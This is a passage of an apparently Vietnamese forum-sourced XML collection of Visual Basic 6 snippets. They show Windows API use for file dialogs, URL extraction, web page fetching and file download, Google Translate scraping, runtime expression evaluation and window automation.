        SendKeys "{END}" 'Đưa trỏ về cuối dòng
ElseIf Val(Txt2.Text) = 0 Then 'Cái này xảy ra khi người ta nhập tòan chuỗi hoặc chuỗi đứng đầu rồi mới tới số (hoặc nhập số đã đời rồi quay lại đầu tiên nhập chuỗi
    Txt2.Text = Right$(Txt2.Text, Len(Txt2.Text) - 1)
End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091823061806</MaVD>
    <NoiDung>Module

Option Explicit
  ' demo project showing how to use the DrawText API function to
  ' shorten a string and add elipsis in the removed section.
  ' by Bryan Stafford of New Vision Software® - newvision@mvps.org
  ' this demo is released into the public domain "as is" without
  ' warranty or guaranty of any kind.  In other words, use at
  ' your own risk.
  
  Private Const vbZLString As String = ""
 
  Public Enum OPENFILENAME_FLAGS
    OFN_ALLOWMULTISELECT = &amp;H200
    OFN_CREATEPROMPT = &amp;H2000
    OFN_ENABLEHOOK = &amp;H20
    OFN_ENABLETEMPLATE = &amp;H40
    OFN_ENABLETEMPLATEHANDLE = &amp;H80
    OFN_EXPLORER = &amp;H80000
    OFN_EXTENSIONDIFFERENT = &amp;H400&amp;
    OFN_FILEMUSTEXIST = &amp;H1000
    OFN_HIDEREADONLY = &amp;H4&amp;
    OFN_LONGNAMES = &amp;H200000
    OFN_NOCHANGEDIR = &amp;H8&amp;
    OFN_NODEREFERENCELINKS = &amp;H100000
    OFN_NOLONGNAMES = &amp;H40000
    OFN_NONETWORKBUTTON = &amp;H20000
    OFN_NOREADONLYRETURN = &amp;H8000
    OFN_NOTESTFILECREATE = &amp;H10000
    OFN_NOVALIDATE = &amp;H100
    OFN_OVERWRITEPROMPT = &amp;H2&amp;
    OFN_PATHMUSTEXIST = &amp;H800
    OFN_READONLY = &amp;H1
    OFN_SHAREAWARE = &amp;H4000
    OFN_SHAREFALLTHROUGH = 2
    OFN_SHAREWARN = 0
    OFN_SHARENOWARN = 1
    OFN_SHOWHELP = &amp;H10
    OFS_MAXPATHNAME = 128
  End Enum
 
  Private Type OPENFILENAME
    lStructSize As Long
    hWndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    Flags As OPENFILENAME_FLAGS
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
  End Type
  
  Private Declare Function GetOpenFileName Lib "comdlg32" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long
 
  Private Declare Function CommDlgExtendedError&amp; Lib "comdlg32" ()
 
Public Function GetOpenName(ByVal hWnd&amp;, ByVal sInitialDir$) As String
  
  Dim lpOFN As OPENFILENAME, sTemp$, nStrEnd&amp;
 
  With lpOFN
    .lStructSize = Len(lpOFN)
    .hWndOwner = hWnd
    .lpstrFilter = "All Files (*.*)" &amp; vbNullChar &amp; "*.*" &amp; vbNullChar &amp; vbNullChar
    .lpstrFile = String$(700, vbNullChar)
    .nMaxFile = 700
    .lpstrFileTitle = String$(260, vbNullChar)
    .nMaxFileTitle = 260
    .lpstrInitialDir = sInitialDir
    .lpstrTitle = "Open A File"
    .Flags = OFN_EXTENSIONDIFFERENT Or OFN_NOCHANGEDIR Or OFN_OVERWRITEPROMPT Or OFN_HIDEREADONLY
  End With
  
  If GetOpenFileName(lpOFN) Then
    sTemp = lpOFN.lpstrFile
    nStrEnd = InStr(sTemp, vbNullChar)
    If nStrEnd &gt; 1 Then
      GetOpenName = Left$(sTemp, nStrEnd - 1)
    Else
      GetOpenName = vbZLString
    End If
  Else
    GetOpenName = vbZLString
  End If
  
End Function

Form


Option Explicit
  ' demo project showing how to use the ReadFile API function to
  ' read an ASCII text file and parse URLs from the text without
  ' converting the entire file to unicode
  ' by Bryan Stafford of New Vision Software® - newvision@mvps.org
  ' this demo is released into the public domain "as is" without
  ' warranty or guaranty of any kind.  In other words, use at
  ' your own risk.
 
  Private Const vbZLString As String = ""
  
  Private Const GENERIC_READ As Long = &amp;H80000000
  Private Const GENERIC_WRITE As Long = &amp;H40000000
 
  Private Const FILE_SHARE_READ As Long = &amp;H1&amp;
  Private Const FILE_SHARE_WRITE As Long = &amp;H2&amp;
 
  Private Const CREATE_NEW As Long = 1&amp;
  Private Const CREATE_ALWAYS As Long = 2&amp;
  Private Const OPEN_EXISTING As Long = 3&amp;
  Private Const OPEN_ALWAYS As Long = 4&amp;
  Private Const TRUNCATE_EXISTING As Long = 5&amp;
 
  Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName$, ByVal dwDesiredAccess&amp;, ByVal dwShareMode&amp;, ByVal lpSecurityAttributes&amp;, ByVal dwCreationDisposition&amp;, ByVal dwFlagsAndAttributes&amp;, ByVal hTemplateFile&amp;) As Long
  Private Declare Function ReadFile Lib "kernel32" (ByVal hFile&amp;, lpBuffer As Any, ByVal nNumberOfBytesToRead&amp;, lpNumberOfBytesRead&amp;, ByVal lpOverlapped&amp;) As Long
  Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject&amp;) As Long
  
  Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpDest As Any, lpSource As Any, ByVal cBytes&amp;)
 
Private Sub cmdSelectFile_Click()
 
  Dim sInputName$, nFileLen&amp;, hFile&amp;, nReadRetVal&amp;, nBytesRead&amp;
  Dim aInputFile() As Byte, oGetFile As cGetFileName
  
  ' begin by clearing the list
  lstURLs.Clear
  
  Set oGetFile = New cGetFileName
  
  ' get the input name dynamically instead of hard coding it like this....
  sInputName = oGetFile.GetOpenName(hWnd, App.Path)
  
  Set oGetFile = Nothing
  
  If sInputName &lt;&gt; vbZLString Then
    nFileLen = FileLen(sInputName)
    
    ReDim aInputFile(nFileLen - 1) As Byte '&lt;-- subtract one for zero based array
    
    ' use APIs to open the file and read the data since I find it easier to manipulate byte
    ' arrays using API functions
    hFile = CreateFile(sInputName, GENERIC_READ, FILE_SHARE_READ, 0&amp;, OPEN_EXISTING, 0&amp;, 0&amp;)
    
    If hFile Then ' if we have a valid file handle, get the data
    
      ' pass a pointer to the buffer to ReadFile....
      nReadRetVal = ReadFile(hFile, ByVal VarPtr(aInputFile(0)), nFileLen, nBytesRead, 0&amp;)
    
      Call CloseHandle(hFile)
      
      If (nReadRetVal &lt;&gt; 0) And (nBytesRead &gt; 0) Then
        Dim i&amp;, nFoundLocation&amp;, sSearchString$, nLastURL&amp;, asURL() As String
        Dim bEmbededCrLf As Boolean
        
        nLastURL = (-1) '&lt;-- set up the string array counter so it will point to "0" when incremented the first time
        
        ReDim asURL(0) As String
        
        ' convert the search string to ANSI
        sSearchString = StrConv("http://", vbFromUnicode)
        
        Do ' loop through the file looking for all occurrences of URL strings....
          
          nFoundLocation = InStrB(nFoundLocation + 1, aInputFile, sSearchString)
          
          If nFoundLocation Then
            ' if we found a URL, loop through the byte array from the found location
            ' until we encounter a space
  
            ' reset the var indicating a carriage return was found in the URL
            bEmbededCrLf = False
            
            i = nFoundLocation + 6 '&lt;-- add the length of the search string
            Do
              i = i + 1
              
              If i &gt; nFileLen Then
                ' error!!  DO SOMETHING!!!!
                Exit Do
              End If
              
              Select Case aInputFile(i)
                Case vbKeySpace, 34, 62 ' 34='"'  62='&gt;'
                  Exit Do ' found a space, '"' or '&gt;', get out of the loop
                  
                Case 13 '&lt;-- vbCr
                  ' set the flag so that carriage returns will be removed
                  bEmbededCrLf = True
                  
              End Select
            Loop While i &lt; nFileLen '&lt;-- safety feature
            
            ' increment the string array counter and add a new string to the array
            nLastURL = nLastURL + 1
            ReDim Preserve asURL(nLastURL) As String
            
            ' allocate string space.  divide by two since VB strings are
            ' unicode and we will be copying an ANSI string into the variable
            asURL(nLastURL) = String$((i - (nFoundLocation - 1)) / 2, 0)
            
            ' copy the string from the byte array into the string
            CopyMemory ByVal StrPtr(asURL(nLastURL)), ByVal VarPtr(aInputFile((nFoundLocation - 1))), i - (nFoundLocation - 1)
            
            ' convert the string to unicode
            asURL(nLastURL) = StrConv(asURL(nLastURL), vbUnicode)
            
            ' remove any carriage returns from the string
            If bEmbededCrLf Then asURL(nLastURL) = Replace(asURL(nLastURL), vbCrLf, vbZLString)
            
            ' account for odd length strings
            If Right$(asURL(nLastURL), 1) = vbNullChar Then asURL(nLastURL) = Left$(asURL(nLastURL), Len(asURL(nLastURL)) - 1)
          End If
          
        Loop Until nFoundLocation = 0
        
        
        If nLastURL &gt; (-1) Then
          ' print your array of URLs to the immediate window
          For i = 0 To nLastURL
            lstURLs.AddItem asURL(i)
          Next
        Else
          lstURLs.AddItem "No URLs Found"
        End If
        
      End If
    End If
  End If
  
End Sub
 
Public Function Replace(ByVal sText$, ByVal sToReplace$, ByVal sReplaceWith$) As String
 
  Dim nRepLoc&amp;
  
  Do
    nRepLoc = InStr(sText, sToReplace)
    
    If nRepLoc Then sText = Left$(sText, nRepLoc - 1) &amp; sReplaceWith &amp; Right$(sText, Len(sText) - ((nRepLoc - 1) + Len(sToReplace)))
  Loop Until nRepLoc = 0
  
  Replace = sText
  
End Function

gửi bởi NoBi » T.Hai 09/02/2009 10:46 am 
Đoạn code trên sẽ ra kết quả http://caulacbovb.net nếu trong file có &lt;a href="http://vbclub.net/"&gt;&lt;/a&gt; nhưng ra kết quả http://caulacbovb.ne nếu trong file có &lt;a href="http://vbclub.net"&gt;&lt;/a&gt; do khi khởi tạo biến chứa chuổi có chiều dài ngắn hơn link. Mình tạm thêm 1 ký tự cho nó ra kết quả đúng:

asURL(nLastURL) = String$((i - (nFoundLocation - 1)) / 2 + 1, 0)

Khi lấy ra thì:

lstURLs.AddItem Trim(asURL(i))
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091923061925</MaVD>
    <NoiDung>Không dùng ctrl thì dùng API zậy 
Đặt cái này trong module. Khi dùng thì gọi Text1.Text = GetUrlSource("http://www.abc.com")

Public Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Public Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal sURL As String, ByVal sHeaders As String, ByVal lHeadersLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Public Declare Function InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Public Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
 
Public Const IF_FROM_CACHE = &amp;H1000000
Public Const IF_MAKE_PERSISTENT = &amp;H2000000
Public Const IF_NO_CACHE_WRITE = &amp;H4000000
       
Private Const BUFFER_LEN = 256
 
Public Function GetUrlSource(sURL As String) As String
    Dim sBuffer As String * BUFFER_LEN, iResult As Integer, sData As String
    Dim hInternet As Long, hSession As Long, lReturn As Long
    hSession = InternetOpen("vb wininet", 1, vbNullString, vbNullString, 0)
    If hSession Then hInternet = InternetOpenUrl(hSession, sURL, vbNullString, 0, IF_NO_CACHE_WRITE, 0)
    If hInternet Then
 
        iResult = InternetReadFile(hInternet, sBuffer, BUFFER_LEN, lReturn)
        sData = sBuffer
 
        Do While lReturn &lt;&gt; 0
            iResult = InternetReadFile(hInternet, sBuffer, BUFFER_LEN, lReturn)
            sData = sData + Mid(sBuffer, 1, lReturn)
        Loop
    End If
    iResult = InternetCloseHandle(hInternet)
    GetUrlSource = sData
End Function

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092023062054</MaVD>
    <NoiDung>Private Sub AddToListBox(ByVal nListBox, ByVal nFileName As String)
    Dim Path As String
    Path = App.Path
    If Right$(Path, 1) &lt;&gt; "\" Then Path = Path &amp; "\"
    Dim theFileName As String
    theFileName = Path &amp; nFileName
    nListBox.Clear
    Dim a As Object: Dim i%: i = 1: Dim nLine As Integer
    Set a = CreateObject("Scripting.FileSystemObject").OpenTextFile(theFileName, 1, , -2)
    nLine = a.Line
    Do Until a.AtEndOfStream
    nListBox.AddItem a.ReadLine
    Loop
End Sub
 
Private Sub Form_Load()
    lsChar.FontName = "VNI-Helve"
    txGO.FontName = "VNI-Helve"
    lsChar.FontSize = 10
    txGO.FontSize = 10
    Call AddToListBox(lsChar, "character.txt")
End Sub
 
Private Sub txGO_KeyPress(KeyAscii As Integer)
Dim i As Long
Dim ChuoiTam As String
Dim KiTu1, KiTu2 As String
    KiTu1 = Right$(txGO, 1)
    KiTu2 = Chr(KeyAscii)
    ChuoiTam = Trim(KiTu1 &amp; KiTu2)
    Label1.Caption = Label1.Caption &amp; Chr(KeyAscii)
    For i = 0 To lsChar.ListCount - 1
        If ChuoiTam = Trim$(Right$(lsChar.List(i), 3)) Then
            If txGO.Text &lt;&gt; "" Then
                lsChar.Selected(i) = True
                txGO = Left$(txGO, Len(txGO) - 1) &amp; Trim$(Left$(lsChar.List(i), 2))
                txGO.SelStart = Len(txGO)
                KeyAscii = 0
            End If
            Exit For
        End If
    Next i
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092523062507</MaVD>
    <NoiDung>Modules laytinve

Option Explicit
 
Private Const INTERNET_OPEN_TYPE_PRECONFIG = 0
Private Const INTERNET_OPEN_TYPE_DIRECT = 1
Private Const INTERNET_OPEN_TYPE_PROXY = 3
 
Private Const scUserAgent = "VBTagEdit"
Private Const INTERNET_FLAG_RELOAD = &amp;H80000000
 
Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" _
(ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, _
ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
 
Private Declare Function InternetOpenUrl Lib "wininet.dll" Alias "InternetOpenUrlA" _
(ByVal hOpen As Long, ByVal sUrl As String, ByVal sHeaders As String, _
ByVal lLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
 
Private Declare Function InternetReadFile Lib "wininet.dll" _
(ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, _
lNumberOfBytesRead As Long) As Integer
 
Private Declare Function InternetCloseHandle Lib "wininet.dll" _
(ByVal hInet As Long) As Integer
 
Private Declare Function URLDownloadToFile Lib "urlmon" _
   Alias "URLDownloadToFileA" _
  (ByVal pCaller As Long, _
   ByVal szURL As String, _
   ByVal szFileName As String, _
   ByVal dwReserved As Long, _
   ByVal lpfnCB As Long) As Long
   
Private Declare Function InternetGetConnectedState _
              Lib "wininet.dll" (ByRef lpdwFlags As Long, _
              ByVal dwReserved As Long) As Long
   
Private Const ERROR_SUCCESS As Long = 0
 
Public Function GetHTMLFromURL(sUrl As String) As String
Dim S                  As String
Dim hOpen              As Long
Dim hOpenUrl           As Long
Dim bDoLoop            As Boolean
Dim bRet               As Boolean
Dim sReadBuffer        As String * 2048
Dim lNumberOfBytesRead As Long
 
hOpen = InternetOpen(scUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, vbNullString, vbNullString, 0)
hOpenUrl = InternetOpenUrl(hOpen, sUrl, vbNullString, 0, INTERNET_FLAG_RELOAD, 0)
 
bDoLoop = True
 
While bDoLoop
    sReadBuffer = vbNullString
    bRet = InternetReadFile(hOpenUrl, sReadBuffer, Len(sReadBuffer), lNumberOfBytesRead)
    S = S &amp; Left$(sReadBuffer, lNumberOfBytesRead)
    If Not CBool(lNumberOfBytesRead) Then bDoLoop = False
Wend
 
If hOpenUrl &lt;&gt; 0 Then InternetCloseHandle (hOpenUrl)
If hOpen &lt;&gt; 0 Then InternetCloseHandle (hOpen)
 
GetHTMLFromURL = S
 
End Function
 
Public Function DownloadFile(ssourceUrl As String, _
                             sLocalFile As String) As Boolean
 
   Dim lngRetVal As Long
   
  'nếu API trả về hàm ERROR_SUCCESS (0)
  'trả về True từ hàm
   DownloadFile = URLDownloadToFile(0&amp;, _
                                    ssourceUrl, _
                                    sLocalFile, _
                                    0&amp;, _
                                    0&amp;) = ERROR_SUCCESS
   
End Function
 
Public Function IsConnected() As Boolean
 
    On Error GoTo err
    IsConnected = InternetGetConnectedState(0&amp;, 0&amp;)
 
Exit Function
 
err:
    IsConnected = True
 
End Function

Modules dich

Option Explicit
 
Global DefLang As String
 
'url dich
Const WebURL As String = "http://translate.google.com/translate_t"
 
'Cái này chỉ cần trước khi dịch ( chuỗi cần dịch )
Const SearchString As String = "result_box dir="  'Changer par Google le 2008-01-12
 
'Trả về chuỗi sau khi đã dịch xong
Const EndString As String = "&lt;/"
 
Public Function Traduction(InputText As String, LangueTrad As String) As String
'Nhưng        = Dịch một văn bản hay một ngôn ngữ khác
'
'Text  = Nhấn text vô đây
'
'Ngôn ngữ= Chọn
 
Dim TMPString  As String
Dim StartPos   As Long
Dim DebString  As String
Dim InitString As String
 
If IsConnected = False Then
   MsgBox "Ban chua ket noi Internet. Hay kiem tra va lam lai!", vbInformation, "Traduction"
   Traduction = ""
   Exit Function
End If
 
'Nhập text
TMPString = GetHTMLFromURL(WebURL &amp; "?langpair=" &amp; LangueTrad &amp; "&amp;text=" &amp; InputText)
 
InitString = SearchString &amp; Chr(34) &amp; "ltr" &amp; Chr(34) &amp; "&gt;"
 
StartPos = InStr(1, TMPString, InitString, vbTextCompare)
If StartPos = 0 Then
   Traduction = ""
   Exit Function
End If
 
DebString = Right(TMPString, Len(TMPString) - (StartPos + Len(InitString) - 1))
 
StartPos = InStr(1, DebString, EndString, vbTextCompare)
 
Traduction = ReplaceHTMLString(Left(DebString, StartPos - 1))
 
End Function
 
Public Function ReplaceHTMLString(InputString) As String
Dim retValue As String
 
retValue = Replace(InputString, "&amp;#39;", "'", 1, -1, vbBinaryCompare)
 
ReplaceHTMLString = retValue
End Function


Form

Option Explicit
Dim TradLang As String
 
Private Sub cmdCopy_Click()
  Clipboard.SetText Me.txtOutputText
End Sub
 
Private Sub cmdTranslate_Click()
Dim MyLang As Variant
 
'// Tiếng
MyLang = Array("en|es", "en|fr", "en|it", _
               "en|pt", "en|ja", "en|ko", _
               "en|zh-CN", "de|en", "de|fr", _
               "es|en", "fr|en", "fr|de", _
               "it|en", "pt|en", "ja|en", "zh-CN|en")
 
 '// Chọn ngôn ngữ
 TradLang = MyLang(Me.cboLang.ListIndex)
 Me!txtOutputText = Traduction(Me.txtInputText, TradLang)
End Sub
 
Private Sub Form_Load()
 
'// Fill combo
With Me.cboLang
 .AddItem "Ti?ng Anh sang Tây ban nha", 0
 .AddItem "Ti?ng Anh sang Pháp", 1
 .AddItem "Ti?ng Anh sang Italia", 2
 .AddItem "Ti?ng Anh sang B? dào nha", 3
 .AddItem "Ti?ng Anh sang Nh?t BETA", 4
 .AddItem "Ti?ng Anh sang Hàn BETA", 5
 .AddItem "Ð?c sang Ti?ng Anh", 6
 .AddItem "Ð?c sang French", 7
 .AddItem "Tây ban nha sang Ti?ng Anh", 8
 .AddItem "Pháp sang Ti?ng Anh", 9
 .AddItem "Pháp sang German", 10
 .AddItem "Itali sang Ti?ng Anh", 11
 .AddItem "B? sang Ti?ng Anh", 12
 .AddItem "Nh?t sang Ti?ng Anh BETA", 13
 .AddItem "Trung sang Ti?ng Anh BETA", 14
'............................................................... Bạn tự cho vào (hơn mấy trăm cách cơ), Có cách hay hơn là bạn cho mỗi một ngôn ngữ 'một ký tự riêng. Chọn cái nào thì tự động nó lấy ký tự đó paste vô vào. Dùng cái array lâu hơn đấy :D
 .ListIndex = 1
End With
  
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092723062715</MaVD>
    <NoiDung>* Cần text1 và text2. Command1
* Khi run: gõ biểu thức vào text1, vd 5*6+4 Xong nhấn command1, text2 ra kết quả

Option Explicit
Private WithEvents AddedCommandButton As CommandButton
Private Declare Function EbExecuteLine Lib "vba6.dll" (ByVal pStringToExec As Long, ByVal Unknownn1 As Long, ByVal Unknownn2 As Long, ByVal fCheckOnly As Long) As Long
 
Public Function ExecuteLine(sCode As String, Optional fCheckOnly As Boolean) As Boolean
   ExecuteLine = EbExecuteLine(StrPtr(sCode), 0&amp;, 0&amp;, Abs(fCheckOnly)) = 0
End Function
Private Sub Command1_Click()
ExecuteLine "var=" &amp; Text1 &amp; ":Form1.Text2.Text=var"
End Sub


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609241328481227</MaVD>
    <NoiDung>'Thanks to ----------michka - Michael Kaplan
'Rest of code by Sergio Perciballi -oigres P (Aug-6-2000)
'Email: oigres@postmaster.co.uk
'Uses the function used by the immediate window
'to execute a line of code.
Option Compare Text
Option Explicit

Private Declare Function EbExecuteLine Lib "vba6.dll" _
        (ByVal pStringToExec As Long, ByVal Foo1 As Long, _
        ByVal Foo2 As Long, ByVal fCheckOnly As Long) As Long

' For VB5 IDE
'Declare Function EbExecuteLine Lib "vba5.dll" _
 (ByVal pStringToExec As Long, ByVal Foo1 As Long, _
 ByVal Foo2 As Long, ByVal fCheckOnly As Long) As Long

' FOR Access 97/VBE.dll clients like Word 97 and Excel 97
'Declare Function EbExecuteLine Lib "vba332.dll" _
 (ByVal pStringToExec As Long, ByVal Foo1 As Long, _
 ByVal Foo2 As Long, ByVal fCheckOnly As Long) As Long

Function FExecuteCode(stCode As String, _
            Optional fCheckOnly As Boolean) As Boolean

    FExecuteCode = EbExecuteLine(StrPtr(stCode), 0&amp;, 0&amp;, Abs(fCheckOnly)) = 0
End Function

Private Sub Form_Load()
    FExecuteCode "msgbox app.Title"
    FExecuteCode "msgbox("Chao " &amp; inputbox("Ten cua ban: ", "Nhap ten") &amp; vbcrlf &amp; "Hom nao ranh di nhau nha!")"
End Sub


gửi bởi truongphu » T.Ba 13/01/2009 3:25 pm 
* Cần text1 và text2. Command1
* Khi run: gõ biểu thức vào text1, vd 5*6+4 Xong nhấn command1, text2 ra kết quả

Option Explicit
Private WithEvents AddedCommandButton As CommandButton
Private Declare Function EbExecuteLine Lib "vba6.dll" (ByVal pStringToExec As Long, ByVal Unknownn1 As Long, ByVal Unknownn2 As Long, ByVal fCheckOnly As Long) As Long
 
Public Function ExecuteLine(sCode As String, Optional fCheckOnly As Boolean) As Boolean
   ExecuteLine = EbExecuteLine(StrPtr(sCode), 0&amp;, 0&amp;, Abs(fCheckOnly)) = 0
End Function
Private Sub Command1_Click()
ExecuteLine "var=" &amp; Text1 &amp; ":Form1.Text2.Text=var"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093323063339</MaVD>
    <NoiDung>'Vẽ lên Form 1 TextBox, 1 Checkbox, 2 Commandbutton, 2 RadioButton(OptionButton)
'Dán đoạn code này vào Form
Option Explicit
 
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
 
Private Const WM_SETTEXT = &amp;HC
Private Const WM_KEYDOWN = &amp;H100
Private Const WM_KEYUP = &amp;H101
Private Const VK_SPACE = &amp;H20
 
Dim WinHwnd As Long
Dim ExHwnd As Long
 
Private Sub Form_Load()
    Me.Caption = "Không dung hàng"
    Text1.Text = "TextText"
End Sub
 
Private Sub Check1_Click()
    'lây' handle cua? Form
    WinHwnd = FindWindow("ThunderRT6FormDC", "Form1")
    'lây' handle cua? CheckBox
    ExHwnd = FindWindowEx(WinHwnd, 0&amp;, "ThunderRT6CheckBox", "Check1")
    If WinHwnd = 0 Then
        MsgBox "Không tìm thây' cua? sô? nào có tên ''Form1''"
    Else
        SendMessage ExHwnd, WM_KEYDOWN, VK_SPACE, 0&amp;
        SendMessage ExHwnd, WM_KEYUP, VK_SPACE, 0&amp;
    End If
End Sub
 
Private Sub Command1_Click()
    'lây' handle cua? Form
    WinHwnd = FindWindow("ThunderRT6FormDC", "Form1")
    'lây' handle cua? Textbox
    ExHwnd = FindWindowEx(WinHwnd, 0&amp;, "ThunderRT6TextBox", vbNullString)
    If WinHwnd = 0 Then
        MsgBox "Không tìm thây' cua? sô? nào có tên ''Form1''"
    Else
        SendMessage ExHwnd, WM_SETTEXT, 0&amp;, ByVal Text1.Text
    End If
End Sub
 
Private Sub Command2_Click()
    'lây' handle cua? Form
    WinHwnd = FindWindow("ThunderRT6FormDC", "Form1")
    'lây' handle cua? CommandButton
    ExHwnd = FindWindowEx(WinHwnd, 0&amp;, "ThunderRT6CommandButton", "Command1")
    If WinHwnd = 0 Then
        MsgBox "Không tìm thây' cua? sô? nào có tên ''Form1''"
    Else
        SendMessage ExHwnd, WM_KEYDOWN, VK_SPACE, 0&amp;
        SendMessage ExHwnd, WM_KEYUP, VK_SPACE, 0&amp;
    End If
End Sub
 
Private Sub Option1_Click()
    'lây' handle cua? Form
    WinHwnd = FindWindow("ThunderRT6FormDC", "Form1")
    'lây' handle cua? CommandButton
    ExHwnd = FindWindowEx(WinHwnd, 0&amp;, "ThunderRT6OptionButton", "Option1")
    If WinHwnd = 0 Then
        MsgBox "Không tìm thây' cua? sô? nào có tên ''Form1''"
    Else
        SendMessage ExHwnd, WM_KEYDOWN, VK_SPACE, 0&amp;
        SendMessage ExHwnd, WM_KEYUP, VK_SPACE, 0&amp;
    End If
End Sub
 
Private Sub Option2_Click()
    'lây' handle cua? Form
    WinHwnd = FindWindow("ThunderRT6FormDC", "Form1")
    'lây' handle cua? CommandButton
    ExHwnd = FindWindowEx(WinHwnd, 0&amp;, "ThunderRT6OptionButton", "Option2")
    If WinHwnd = 0 Then
        MsgBox "Không tìm thây' cua? sô? nào có tên ''Form1''"
    Else
        SendMessage ExHwnd, WM_KEYDOWN, VK_SPACE, 0&amp;
        SendMessage ExHwnd, WM_KEYUP, VK_SPACE, 0&amp;
    End If
End Sub


Tạo Project mới.

'Vẽ lên Form 1 Textbox , 1 Checkbox, 1 Commandbutton, 2 RadioButton(OptionButton)
'Dán đoạn code vào form rồi Compile thành file EXE
 
Option Explicit
 
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Private Const SND_ASYNC = &amp;H1
Private Const SND_NODEFAULT = &amp;H2
 
Private Sub Command1_Click()
    sndPlaySound "C:\WINDOWS\Media\ding.wav", SND_ASYNC Or SND_NODEFAULT
End Sub
 
Private Sub Form_Load()
    Text1.Text = ""
End Sub

Biên dịch cả 2 thành EXE rồi chạy cả 2 cái...
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093523063553</MaVD>
    <NoiDung>Cách thường dùng cũ

Function GetDecimal(ByVal i As Double) As Double
    GetDecimal = i - Fix(i)
End Function

Cách này sẽ cho ra số không đúng vì GetDecimal(9,3) = 0,300000000000001

Function GetDecimal(ByVal i As Double) As Double
    Dim m As Integer
    m = Len(Trim(Str(i))) - InStr(Str(i), ".") + 1
    GetDecimal = Right(Str(i), Len(Str(i)) - InStr(Str(i), "."))
    GetDecimal = GetDecimal / (10 ^ m)
End Function

Cách này sẽ chính xác hơn.
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093723063733</MaVD>
    <NoiDung>Cần Command1

Option Explicit
  ' demo project showing how to use the ChooseColor API function
  ' by Bryan Stafford of New Vision Software® - newvision@mvps.org
  ' this demo is released into the public domain "as is" without
  ' warranty or guaranty of any kind.  In other words, use at
  ' your own risk.
 
  Public Enum CHOOSE_COLOR_FLAGS
    CC_RGBINIT = &amp;H1&amp;
    CC_FULLOPEN = &amp;H2&amp;
    CC_PREVENTFULLOPEN = &amp;H4&amp;
    CC_SHOWHELP = &amp;H8&amp;
    CC_ENABLEHOOK = &amp;H10&amp;
    CC_ENABLETEMPLATE = &amp;H20&amp;
    CC_ENABLETEMPLATEHANDLE = &amp;H40&amp;
    CC_SOLIDCOLOR = &amp;H80&amp;
    CC_ANYCOLOR = &amp;H100&amp;
  End Enum
  
  Private Type CHOOSECOLOR
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    rgbResult As Long
    lpCustColors As Long
    flags As CHOOSE_COLOR_FLAGS
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
  End Type
 
  Private Declare Function ChooseColor_API Lib "comdlg32.dll" Alias "ChooseColorA" (lpChoosecolor As CHOOSECOLOR) As Long
 
Private Sub Command1_Click()
  ' call the choosecolor dialog to change the backcolor of the form
  
  Dim lpChoosecolor As CHOOSECOLOR
  Dim aColorRef(15) As Long
  
  With lpChoosecolor
    .lStructSize = Len(lpChoosecolor)
    .hwndOwner = hWnd
    .rgbResult = Me.BackColor
    .lpCustColors = VarPtr(aColorRef(0))
    .flags = CC_SOLIDCOLOR Or CC_ANYCOLOR Or CC_RGBINIT
  End With
 
  If ChooseColor_API(lpChoosecolor) Then
    BackColor = lpChoosecolor.rgbResult
  End If
  
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093923063916</MaVD>
    <NoiDung>'Thêm vào Form 1 textbox tên Text1
'Add Preferences --&gt; Microsoft HTML Object Library
'Nếu thay bằng textbox có hổ trợ Unicode thì đọc được luôn tiếng Việt.
Option Explicit
 
Private Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
